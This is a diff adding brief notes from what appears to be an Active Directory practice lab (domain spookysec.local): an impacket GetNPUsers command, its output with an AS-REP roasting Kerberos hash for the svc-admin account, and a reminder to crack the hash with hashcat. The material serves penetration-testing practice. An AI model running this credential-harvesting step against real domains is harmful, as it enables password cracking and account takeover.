@@ -1,0 +1,11 @@
+impacket-GetNPUsers spookysec.local/svc-admin -dc-ip 10.201.30.111   
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[*] Cannot authenticate svc-admin, getting its TGT
+
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:bd4b3ef4f7baf60c5a075f58cd8d220a$a2ddbf95c4f2a8bde1dc39cb35caa941a6c19c9b1cea0afb844dd991614eaaa851c2c9a25bfc50e7a2e799280f060be0bd4ccf54f38b31b12eb02cfd0cb2a9d545c2340d3f364dd47deb50dd0417166c2f98862aafc618e890b76dd4225e7731d3043b02a2ab91e4f4a0e7ede321fc3fb28a43e8ec31a3e5d3ad4c20f3db85b079e9d0f7f208caecccba9da78cb0cd7c97d1b1cb80b37953ff38d2e7e82ce65ea1876954658171410e23efc47992b11f8f088ab4cb7cdd6cfa0641606b1abf77a497bd8dac7619f9ada28649392d9a86bf2a14b6eb67d8db580401ca0816104aab4a294c4e8220ba698fab36f1d15a3437
+
+(always copy full as hash to crack with hashcat)
+
+---------------------------------------------------------------------------------------
